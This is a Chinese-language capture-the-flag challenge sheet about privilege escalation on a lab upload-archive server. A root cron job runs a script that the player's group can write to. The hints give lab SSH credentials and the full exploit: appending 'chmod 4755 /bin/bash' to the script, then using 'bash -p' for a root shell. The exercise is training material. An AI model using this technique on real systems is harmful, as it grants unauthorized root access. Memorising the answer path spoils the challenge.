# 第 3 题：root 的计划任务在用“大家的”脚本

## 场景

这是一台**上传归档**服务器。运维写了个计划任务，**每分钟由 root 执行**一次
`/opt/archive/run.sh`，把 `/srv/uploads` 打包备份。

你（`player`）是负责维护上传目录的运维成员。你能上传、能改上传目录，
但你没有 root。

## 目标

拿到 root 权限，读取 `/flag.txt`：

```bash
cat /flag.txt
```

## 登录

```bash
ssh -p 22003 player@<主机IP>
# 密码：Player@2026
```

## 提示

1. 系统里有哪些**由 root 自动执行**的任务？
   ```bash
   cat /etc/crontab
   ls -la /etc/cron.d/
   cat /etc/cron.d/archive
   ```
2. 找到任务后，看它执行的**文件**——属主是谁？权限是什么？
   ```bash
   ls -la /opt/archive/
   ```
3. 关键判断：这个文件**我能不能改**？我的组是什么？
   ```bash
   id
   ```
4. 如果我能改，改完之后**谁来执行它**？多久执行一次？
5. 在脚本里加一行让 `/bin/bash` 变 SUID，然后等最多 1 分钟：
   ```bash
   echo 'chmod 4755 /bin/bash' >> /opt/archive/run.sh
   ```
6. 一分钟后：
   ```bash
   /bin/bash -p
   id
   cat /flag.txt
   ```

## 评分

成功 `cat /flag.txt` 得到 `Ly_Flag{...}` 即为通过。
